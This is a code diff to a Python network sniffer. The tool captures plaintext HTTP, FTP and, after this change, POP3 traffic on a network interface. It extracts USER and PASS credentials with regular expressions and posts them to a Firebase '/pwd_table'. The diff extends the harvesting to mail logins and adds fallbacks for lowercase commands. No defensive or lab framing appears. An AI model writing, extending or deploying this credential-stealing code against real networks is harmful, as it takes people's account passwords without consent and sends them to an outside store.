@@ -9,7 +9,7 @@ from pprint import pprint
 import settings
 from utils import add_colons_to_mac
 
-APP = {80: 'HTTP', 23: 'TELNET', 21: 'FTP'}
+APP = {80: 'HTTP', 23: 'TELNET', 21: 'FTP', 110: 'POP3'}
 
 
 class Sniffer(object):
@@ -24,7 +24,7 @@ class Sniffer(object):
         # Status update
         self._firebase.patch('/status', {"status": "ON"})
 
-        pattern = 'tcp and dst port 80 or dst port 21'
+        pattern = 'tcp and dst port 80 or dst port 21 or dst port 110'
         # pattern = 'tcp and dst port 80 or dst port 21'
 
         self.pc = pcap.pcap(kwargs['interface'])
@@ -119,10 +119,16 @@ class Sniffer(object):
         pprint(self.all_user_info[self.info_counter])
         self._firebase.post('/pwd_table', self.all_user_info[self.info_counter])
 
-    def _get_ftp_payload(self, eth_pkt, ip_pkt, tcp_pkt):
+    def _get_ftp_pop_payload(self, eth_pkt, ip_pkt, tcp_pkt):
         if 'USER' in tcp_pkt.data:
             regex = re.compile('USER (.*)')
             user_obj = regex.search(tcp_pkt.data)
+            if user_obj is None:
+                regex = re.compile('user (.*)')
+                user_obj = regex.search(tcp_pkt.data)
+                if user_obj is None:
+                    return
+
             user_d = {'USER': user_obj.group(1).rstrip('\r')}
             self._pick_ftp_info(user_d, socket.inet_ntoa(ip_pkt.src),
                                 socket.inet_ntoa(ip_pkt.dst), tcp_pkt.dport,
@@ -130,6 +136,13 @@ class Sniffer(object):
         elif 'PASS' in tcp_pkt.data:
             regex = re.compile('PASS (.*)')
             password_obj = regex.search(tcp_pkt.data)
+
+            if password_obj is None:
+                regex = re.compile('pass (.*)')
+                password_obj = regex.search(tcp_pkt.data)
+                if password_obj is None:
+                    return
+
             password_d = {'PASS': password_obj.group(1).rstrip('\r')}
             self._pick_ftp_info(password_d, socket.inet_ntoa(ip_pkt.src),
                                 socket.inet_ntoa(ip_pkt.dst), tcp_pkt.dport,
@@ -190,8 +203,8 @@ class Sniffer(object):
                         # make sure the pattern is correct
                         if tcp.dport == 80:
                             self._get_http_payload(eth, ip, tcp)
-                        elif tcp.dport == 21:
-                            self._get_ftp_payload(eth, ip, tcp)
+                        elif tcp.dport == 21 or tcp.dport == 110:
+                            self._get_ftp_pop_payload(eth, ip, tcp)
                         else:
                             pass
 
